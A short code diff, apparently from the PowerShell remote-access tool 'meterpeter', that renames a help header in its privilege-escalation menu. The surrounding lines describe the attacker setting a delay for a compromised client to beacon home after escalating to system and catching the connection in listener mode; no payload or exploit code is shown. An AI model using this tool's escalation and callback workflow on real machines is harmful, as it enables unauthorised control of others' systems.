@@ -912,8 +912,8 @@ While($Client.Connected)
       $choise = Read-Host;
       If($choise -eq "Escalate" -or $choice -eq "escal")
       {
-        write-host "`n   Requirements" -ForegroundColor Yellow;
-        write-host "   ------------";
+        write-host "`n   Getsystem Requirements" -ForegroundColor Yellow;
+        write-host "   ----------------------";
         write-host "   Attacker needs to input the delay time (in seconds) for the Client";
         write-host "   to beacon home after privilege escalation. Attacker also needs to exit";
         write-host "   and put meterpeter in listenner mode to be abble to catch the connection.";
